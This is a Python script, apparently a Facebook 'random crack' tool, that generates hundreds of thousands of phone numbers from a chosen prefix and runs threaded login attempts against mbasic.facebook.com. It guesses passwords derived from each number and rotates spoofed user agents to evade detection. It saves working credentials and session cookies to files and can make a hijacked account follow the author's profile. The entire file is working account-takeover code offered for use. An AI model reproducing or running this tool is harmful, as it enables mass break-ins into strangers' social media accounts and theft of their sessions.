import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\\033[1;91m [●] Sorry there is no Active  Apk ')
    else:
        print(f'\r \033[1;92m[●] Your Active Apps :{WHITE}' )
        for i in range(len(game)):
            print(f"\r [%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\\033[1;91m [●] Sorry there is no Expired Apk\n')
    else:
        print(f'\\033[1;92m [●] Your Expired Apps   :{WHITE}')
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU

my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo ="""       
\033[1;32m╔════════════════════════════════════════════════════════════╗\033[1;93m
\033[1;32m║	             \033[1;93m ─━㋱WELLCOME FUCK ㋱━─\033[1;32m 	             ║
\033[1;32m╔════════════════════════════════════════════════════════════╗
\033[1;32m║\033[0;32m/ .----------------.  .----------------.  .----------------.  .----------------. \033[1;32m║
\033[1;32m║\033[0;31m| | .--------------. || .--------------. || .--------------. || .--------------. |\033[1;32m║
\033[1;32m║\033[0;32m| | |      __      | || |  ________    | || |     _____    | || |   ______     | |\033[1;32m║
\033[1;32m║\033[0;33m|| |     /  \     | || | |_   ___ `.  | || |    |_   _|   | || |  |_   _ \    | |\033[1;32m║
\033[1;32m║\033[0;34m|| |    / /\ \    | || |   | |   `. \ | || |      | |     | || |    | |_) |   | |\033[1;32m║
\033[1;32m║\033[0;35m| | |   / ____ \   | || |   | |    | | | || |      | |     | || |    |  __'.   | |\033[1;32m║
\033[1;32m║\033[0;36m| | | _/ /    \ \_ | || |  _| |___.' / | || |     _| |_    | || |   _| |__) |  | |/ \033[1;32m║
\033[1;32m║\033[1;31m|__/     |_______/ |__/  |__/ \____  $$ \_______/ \______/  \033[1;32m║
\033[1;32m║   \033[1;31m      | ||____|  |____|| || | |________.'  | || |    |_____|   | || |  |_______/   | |                     /$$  | $$                     \033[1;32m║
\033[1;32m║      \033[1;31m | |              | || |              | || |              | || |              | |\033[1;32m║
\033[1;32m║         \033[1;31m | '--------------' || '--------------' || '--------------' || '--------------' |\033[1;32m║
\033[1;32m╚════════════════════════════════════════════════════════════╝                              
\033[1;32m╔════════════════════════════════════════════════════════════╗
\033[1;32m║\033[0;32m          𝐓𝐄𝐀𝐌 𝐍𝐀𝐌𝐄      ➣ 𝐓𝐄𝐀𝐌 𝐍𝐒𝐍                         \033[1;32m║
\033[1;32m║\033[0;31m          𝐀𝐔𝐓𝐇𝐎𝐑         ➣ AHMED ADIB ?                   \033[1;32m║
\033[1;32m║\033[0;33m          𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊       ➣ AHMED ADIB ?                   \033[1;32m║
\033[1;32m║\033[0;34m          𝐆𝐈𝐓𝐇𝐔𝐁         ➣ Zoker-adib -23                        \033[1;32m║
\033[1;32m║\033[0;35m          𝐖𝐇𝐀𝐓𝐒 𝐀𝐏𝐏      ➣ 01319361081                      \033[1;32m║
\033[1;32m║\033[0;36m          𝐓𝐎𝐎𝐋 𝐍𝐀𝐌𝐄      ➣ 𝐑𝐀𝐍𝐃𝐎𝐌                           \033[1;32m║
\033[1;32m║\033[0;31m          𝐓𝐎𝐎𝐋 𝐒𝐓𝐔𝐓𝐀𝐒    ➣ 𝐅𝐑𝐄𝐄                             \033[1;32m║
\033[1;32m║\033[0;32m          𝐕𝐀𝐑𝐒𝐈𝐎𝐍        ➣ 0.0.0                            \033[1;32m║
\033[1;32m║\033[0;33m          𝐒𝐄𝐑𝐕𝐄𝐑         ➣  𝐃𝐀𝐓𝐀-𝐖𝐈𝐅𝐈                       \033[1;32m║
\033[1;32m╚════════════════════════════════════════════════════════════╝                                                            """
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
 
try:
	
    print(' \033[1;91m[\033[1;92m●\033[1;91m]\033[1;92m JOIN  TEAM-POM POMPUBLIC GROUP...')
    # print(' \033[1;91m[\033[1;92m●\033[1;91m]\033[1;92m NOTE : AMADER 7 TARIK THEKE 9 TARIK POJONTO CROW NEWA HOBE...')
    # print(' \033[1;91m[\033[1;92m●\033[1;91m]\033[1;92m JARA JOIN HOTE CHAN TARA JOIN HOTE PAREN CRODES FEE SIMITO...')
    time.sleep(3)
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('xdg-open https://www.facebook.com/profile.php?id=100085190331409')
    else:pass
except:print('\n \033[1;91m[\033[1;92m●\033[1;91m] No internet connection ...')
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

ugen2 = []
ugen = []
 

for x in range(1000):
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android 12; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX3195 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 wkbrowser 5.0.17 {str(rr(2111111,2999999))} js 5.1.1 newfocus lng=ru"
    empat  = f"Mozilla/5.0 (Linux; Android 9{str(rr(7,12))}; RMX1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    lima  = f"Mozilla/5.0 (Linux; Android 12{str(rr(7,12))}; IN2013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    UserAgentss = str(rc([satu,dua,tiga,empat,lima]))
    ugen.append(UserAgentss)

###----------[ USER AGENT ]----------###
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku) 

    
    
def news():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('  \033[1;91m[\033[1;92m●\033[1;91m]\033[1;93m Example \033[1;91m>>\033[1;92m 0171 \033[1;91m<>\033[1;92m 0175 ')
    print('  \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱')
    code = input('\n  \033[1;91m[\033[1;92m●\033[1;91m]\033[1;93m CHOOSE GP CODE\033[1;91m>>\033[1;92m ')
    limit = 500000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    RimonID = []
    print("")
    for bilal in range(passx):
        pww = 0
        RimonID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('  \033[1;91m[\033[1;92m●\033[1;91m]\033[1;92m YOUR SLECTED SIM \033[1;91m>>\033[1;96m '+code)
        print('  \033[1;91m[\033[1;92m●\033[1;91m]\033[1;92m TOTAL IDS \033[1;91m>>\033[1;93m '+tl)
        print('  \033[1;91m[\033[1;92m●\033[1;91m]\033[1;92m THE PROCESS HAS BEEN STARTED')
        print('  \033[1;91m[\033[1;92m●\033[1;91m]\x1b[38;5;208m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print('  \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in RimonID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(new,uid,pwx,tl)
    print('\n \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱')
    print(' \033[1;91m[\033[1;92m●\033[1;91m]\033[1;92m Crack process has been completed')
    print(' \033[1;91m[\033[1;92m●\033[1;91m]\033[1;92m Ids saved in Q-AD1B/ok.txt,Q-AD1B/cp.txt')
    print(' \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱')

def new(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
    'method': 'GET',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(' \n\033[1;97m[\033[1;92mAD1B-OK\033[1;97m]\033[1;92m ' +uid+ '\033[1;91m<>\033[1;92m' +ps+ '\n \033[1;91m[\033[1;92m●\033[1;91m]\033[1;92m COOKIES \033[1;91m=\033[1;96m '+coki+'')                
                open('/sdcard/AD1B-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                #print('[CP] ' +uid+ '|' +ps+ '')
                open('/sdcard/AD1B-cp.txt', 'a').write( uid+' | '+ps+'')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r \x1b[38;5;196m[\x1b[38;5;46mAD1B\x1b[38;5;196m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
        sys.stdout.flush()
    except:
        pass

news()